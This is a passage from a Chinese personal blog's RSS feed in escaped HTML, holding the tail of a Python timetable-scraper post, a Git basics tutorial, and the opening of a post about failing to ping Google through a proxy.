&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    find_student_name &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;compile(&lt;span style=&#34;color:#f1fa8c&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;[\u4e00-\u9fa5]+的课表&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    student_name_soup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; soup&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;div&amp;#34;&lt;/span&gt;,{&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;timetable_title&amp;#34;&lt;/span&gt;})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    student_name &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; find_student_name&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;findall(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(student_name_soup))[:&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#6272a4&#34;&gt;#强制转化可以把TAG类转化为str,但是我感觉不是很完美&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(student_name&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;的课表&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;except&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;未找到名称&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    content &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    find_inner_html &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;compile(&lt;span style=&#34;color:#f1fa8c&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;\&amp;#39;[^\&amp;#39;]*\&amp;#39;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; week &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;6&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; classtime &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;12&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            each_class &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; soup&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;td&amp;#34;&lt;/span&gt;,{&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(week)&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(classtime)})   &lt;span style=&#34;color:#6272a4&#34;&gt;#找td标签&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; each_class &lt;span style=&#34;color:#ff79c6&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;None&lt;/span&gt; : &lt;span style=&#34;color:#6272a4&#34;&gt;#跳过空类型&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;continue&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            each_class &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; each_class&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;findAll(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;font&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; each_class &lt;span style=&#34;color:#ff79c6&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;None&lt;/span&gt; : &lt;span style=&#34;color:#6272a4&#34;&gt;#跳过空类型&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;continue&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; each &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; each_class:  &lt;span style=&#34;color:#6272a4&#34;&gt;#获取td标签里的内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; child &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; each&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;children:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    name &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;find_inner_html&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;findall(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(child&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;unwrap))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; name:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        content&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;append(name[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; content:  &lt;span style=&#34;color:#6272a4&#34;&gt;#添加课表&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;len&lt;/span&gt;(content) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;11&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;单&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(week)]&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;update({&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(classtime):content})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;双&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(week)]&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;update({&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(classtime):content})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ff79c6&#34;&gt;elif&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;len&lt;/span&gt;(content) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;22&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;单&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(week)]&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;update({&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(classtime):content[:&lt;span style=&#34;color:#bd93f9&#34;&gt;11&lt;/span&gt;]})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;双&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(week)]&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;update({&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(classtime):content[&lt;span style=&#34;color:#bd93f9&#34;&gt;11&lt;/span&gt;:]})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            content &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;#写入文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;open&lt;/span&gt;(stored_place&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; file:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; student_name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        timetable[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;stored&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        file&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;write(json&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;dumps(timetable)) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print_class(timetable,time_judge)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#print(timetable)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然，之后也新建一个bat帮助自动执行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bat&#34; data-lang=&#34;bat&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;f:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;cd&lt;/span&gt; F:\ProbeN1\timetable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 timetable.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;pause&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后再在windows里设置&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240233227f86abb2a9b63a5.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240233227f86abb2a9b63a5.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Git</title>
        <link>https://proben1.github.io/2021/git/</link>
        <pubDate>Sun, 14 Nov 2021 09:58:45 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/git/</guid>
        <description>&lt;img src="https://pic.imgdb.cn/item/624024bb27f86abb2aa32a8d.png" alt="Featured image of post Git" /&gt;&lt;h1 id=&#34;配置&#34;&gt;配置&lt;/h1&gt;
&lt;p&gt;git config -l   全部配置&lt;/p&gt;
&lt;p&gt;git config &amp;ndash;global &amp;ndash;list  用户配置&lt;/p&gt;
&lt;p&gt;所有配置文件都保存在本地&lt;/p&gt;
&lt;p&gt;!! 设置用户与邮箱 !!!!!!&lt;/p&gt;
&lt;p&gt;git config &amp;ndash;global user.name &amp;ldquo;xixi&amp;rdquo;&lt;/p&gt;
&lt;p&gt;git config &amp;ndash;global user.email  &amp;ldquo;&lt;a class=&#34;link&#34; href=&#34;mailto:xixi@github.com&#34; &gt;xixi@github.com&lt;/a&gt;&amp;rdquo;&lt;/p&gt;
&lt;h1 id=&#34;git理论&#34;&gt;git理论:&lt;/h1&gt;
&lt;p&gt;Workspace:工作区,平时存放代码的地方&lt;/p&gt;
&lt;p&gt;Index/stage:暂存区,临时存放你的改动,本质上只是一个文件,保存即将提交到文件列表的信息(.git)&lt;/p&gt;
&lt;p&gt;Repository:本地仓库,安全存放数据的位置,这里有提交到所有版本的数据,其中HEAD指向最新放入仓库的版本&lt;/p&gt;
&lt;p&gt;远程仓库:托管代码的服务器,github,gitee(码云)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240209b27f86abb2a8b1465.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240209b27f86abb2a8b1465.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;流程&#34;&gt;流程:&lt;/h2&gt;
&lt;p&gt;1.工作区添加,修改文件&lt;/p&gt;
&lt;p&gt;2.将需要进行版本控制的文件放入暂存区&lt;/p&gt;
&lt;p&gt;3.将暂存区的文件提交到git仓库&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624020d627f86abb2a8c9893.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624020d627f86abb2a8c9893.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;建立项目&#34;&gt;建立项目&lt;/h2&gt;
&lt;p&gt;git init  初始化&lt;/p&gt;
&lt;p&gt;git clone [url]&lt;/p&gt;
&lt;p&gt;ps:&lt;/p&gt;
&lt;p&gt;GitHub在国内访问速度慢的原因其实有很多，但最主要的原因就是GitHub的分发加速网络域名遭到DNS的污染。&lt;/p&gt;
&lt;p&gt;为了解决这个问题，网上有很多文章提供了一个解决方案，就是通过修改Hosts文件，绕过国内的DNS解析，直接访问GitHub的CDN节点，从而达到加速的目的。&lt;/p&gt;
&lt;p&gt;当然也可以看看上一篇博客。&lt;/p&gt;
&lt;h2 id=&#34;文件状态&#34;&gt;文件状态:&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624020e127f86abb2a8cdcf5.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624020e127f86abb2a8cdcf5.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;git status 查看文件状态&lt;/p&gt;
&lt;p&gt;git status [filename]  查看文件状态&lt;/p&gt;
&lt;p&gt;git add . 添加所有文件到暂存区&lt;/p&gt;
&lt;p&gt;git commit -m &amp;ldquo;提交信息&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240209b27f86abb2a8b1465.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240209b27f86abb2a8b1465.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;忽略文件&#34;&gt;忽略文件:&lt;/h2&gt;
&lt;p&gt;主目录下建立 .gitignore&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240210a27f86abb2a8de2f2.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240210a27f86abb2a8de2f2.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;ssh&#34;&gt;.ssh&lt;/h2&gt;
&lt;p&gt;为啥要配置ssh?&lt;/p&gt;
&lt;p&gt;免密码登录!&lt;/p&gt;
&lt;p&gt;ssh-keygen -t [算法] 生成公钥&lt;/p&gt;
&lt;p&gt;许可证:开源可以随意使用/开源,但不能用与商业&amp;hellip;&amp;hellip;.&lt;/p&gt;
&lt;h2 id=&#34;git分支&#34;&gt;git分支:&lt;/h2&gt;
&lt;p&gt;git branch 列出分支&lt;/p&gt;
&lt;p&gt;git checkout -b [branch] 新建一个分支并切换到这个分支里&lt;/p&gt;
&lt;p&gt;git merge 合并到主分支&lt;/p&gt;
&lt;p&gt;注意:如果合并的时候出现差异,需要进行协商(物理)&lt;/p&gt;
&lt;p&gt;工作分支一般叫dev,主分支一般是非常稳定 的版本&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;其他&lt;/h1&gt;
&lt;p&gt;版本冲突的问题。&lt;/p&gt;
&lt;p&gt;有如下几种解决方法：&lt;/p&gt;
&lt;p&gt;1.使用强制push的方法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git push -u origin master -f 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候。&lt;/p&gt;
&lt;p&gt;2.push前先将远程repository修改pull下来&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git pull origin master
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git push -u origin master
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;3.若不想merge远程和本地修改，可以先创建新的分支，然后push：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git branch [name]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git push -u origin [name]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gitee.com/all-about-git&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gitee.com/all-about-git&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不要把git想的很难,没有笨人,只有懒人.&lt;/p&gt;
&lt;p&gt;&amp;ndash;狂神&lt;/p&gt;
</description>
        </item>
        <item>
        <title>怎么ping不了</title>
        <link>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</link>
        <pubDate>Thu, 11 Nov 2021 03:32:29 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/</guid>
        <description>&lt;img src="https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/whynotping.jpg" alt="Featured image of post 怎么ping不了" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
&lt;p&gt;关于为什么要取一个这么沙雕的名字是有原因的，是因为一个冬至的晚上我想用&lt;code&gt;hexo d&lt;/code&gt;来把更新的博客上传到github pages上去，然而很不巧的是它给我报了这样一个错误：&lt;/p&gt;
&lt;p&gt;Error！！&lt;/p&gt;
&lt;p&gt;好吧截图暂时复现不到了，它的意思大概是无法和github进行连接。明明挂了梯子，可以在谷歌上搜索东西，甚至把clash的全局代理打开了，为什么不能在windows终端里连接到github呢？于是我想确认一下这终端是不是真的连上了代理，就做了一件事情：ping google.com&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 269; 
			flex-basis: 646px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z.png&#34; data-size=&#34;536x199&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z.png&#34;
			width=&#34;536&#34;
			height=&#34;199&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z_hu7871a386e4168688896864e0351ebfe5_14787_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/HhCprvVJQkKbY4Z_hu7871a386e4168688896864e0351ebfe5_14787_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;HhCprvVJQkKbY4Z&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;HhCprvVJQkKbY4Z&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;md，然后我就开始想为什么ping不通google。&lt;/p&gt;
&lt;h1 id=&#34;要说的话&#34;&gt;要说的话&lt;/h1&gt;
&lt;p&gt;2021届安全组的成员们，注意啦！！！&lt;/p&gt;
&lt;p&gt;可能大家以后学习安全的方向不尽相同，但是如果你在&lt;a class=&#34;link&#34; href=&#34;https://www.sec-wiki.com/skill/index&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;secwiki&lt;/a&gt;上查找过的话，可以发现有一条打造科学的工作环境，这其中就包括学会使用谷歌搜索。更何况现在，我认为这正在逐渐向基本的生活技能靠拢……不单单搜谷歌，查文献，steam社区，逛github这些也很有必要。&lt;/p&gt;
&lt;p&gt;之前一直在用QQ浏览器，有的地方被坑惨了（真的，推荐大家一开始就用谷歌浏览器，特别是web方向）。换了之后界面简洁，而且hackbar这些插件也十分方便，最主要的是没啥大病，不会在该弹出下载的地方给你弹出404。&lt;/p&gt;
&lt;p&gt;有什么好处？&lt;/p&gt;
&lt;p&gt;可以访问真正的互联网，将你的信息接收范围面向世界。
方便做很多事情。&lt;/p&gt;
